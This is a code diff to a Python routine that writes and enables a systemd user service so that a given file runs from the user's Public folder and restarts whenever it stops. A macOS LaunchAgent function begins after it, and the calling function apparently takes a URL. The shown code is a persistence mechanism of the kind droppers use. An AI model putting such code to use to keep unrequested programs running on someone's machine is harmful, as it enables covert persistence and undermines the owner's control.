@@ -22,29 +22,33 @@ def run(url, file_path):
 
 
     def create_systemd_service(file_path):
-        subprocess.run(f"mkdir -p  /home/{getpass.getuser()}/.config/systemd/user/", shell=True)
+        user = getpass.getuser()
+        service_dir = f"/home/{user}/.config/systemd/user/"
+        service_file = os.path.join(service_dir, "my_service.service")
 
-        with open (f"/home/{getpass.getuser()}/.config/systemd/user/systemd.service", 'w+') as f:
+        # Create directory if it doesn't exist
+        os.makedirs(service_dir, exist_ok=True)
+
+        # Write service file
+        with open(service_file, 'w') as f:
             f.write(f"""[Unit]
-Description=systemd service
-After=network-online.target
-Wants=network-online.target
+    Description=My Python Service
+    After=network-online.target
+    Wants=network-online.target
 
-[Service]
-ExecStart={file_path}
-WorkingDirectory=%h/Public
-Restart=always
+    [Service]
+    ExecStart={file_path}
+    WorkingDirectory=%h/Public
+    Restart=always
 
-[Install]
-WantedBy=multi-user.target
+    [Install]
+    WantedBy=default.target
+    """)
 
-[Install]
-WantedBy=multi-user.target""")
-
-        subprocess.run('chmod +x /home/{getpass.getuser()}/.config/systemd/user/systemd.service', shell=True)
+        # Reload systemd, start and enable the service
         subprocess.run('systemctl --user daemon-reload', shell=True)
-        subprocess.run('systemctl --user start systemd', shell=True)
-        subprocess.run('systemctl --user enable systemd', shell=True)
+        subprocess.run('systemctl --user start my_service.service', shell=True)
+        subprocess.run('systemctl --user enable my_service.service', shell=True)
     
     def create_launch_agent(path, label):
         plist_content = f"""
